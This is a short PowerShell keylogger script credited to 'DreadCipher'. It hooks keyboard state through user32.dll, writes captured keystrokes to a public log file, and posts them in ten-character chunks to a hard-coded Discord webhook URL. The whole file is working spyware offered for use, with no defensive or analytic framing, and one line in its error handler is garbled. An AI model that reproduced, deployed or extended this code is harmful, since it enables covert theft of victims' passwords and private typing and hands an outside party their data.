# Keylogger with Discord by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyHook {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int vKey);
}
"@

$buffer = ""
"Keylogger started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append

while ($true) {
    Start-Sleep -Milliseconds 40  # Tighter loop for responsiveness
    for ($key = 8; $key -le 254; $key++) {
        $state = [KeyHook]::GetAsyncKeyState($key)
        if ($state -eq -32767) {  # Key pressed
            # Skip modifiers
            if ($key -in 16,17,18,160,161,162,163) { continue }
            
            $shift = [KeyHook]::GetKeyState(0x10) -band 0x8000
            $caps = [Console]::CapsLock
            $char = if ($key -ge 65 -and $key -le 90) {  # A-Z
                if ($shift -xor $caps) { [char]$key } else { [char]($key + 32) }
            } elseif ($key -ge 48 -and $key -le 57) { [char]$key }  # 0-9
            elseif ($key -eq 32) { " " }  # Space
            elseif ($key -eq 13) { "`n" }  # Enter
            elseif ($key -eq 190) { "." }  # Period
            elseif ($key -eq 188) { "," }  # Comma
            else { "" }

            if ($char) {
                $buffer += $char
                "Added '$char' ($key) to buffer: '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                if ($buffer.Length -ge 10) {
                    try {
                        $sendBuffer = $buffer.Substring(0, 10)  # Take first 10 chars
                        "Sending '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $payload = @{ content = "Typed: $sendBuffer" } | ConvertTo-Json
                        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
                        "Sent '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $buffer = $buffer.Substring(10)  # Keep the rest
                    } catch {
                        "Error sending '$send
                        "Error sending '$buffer' at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                        $buffer = "" 
                    }
                }
            }
        }
    }
}
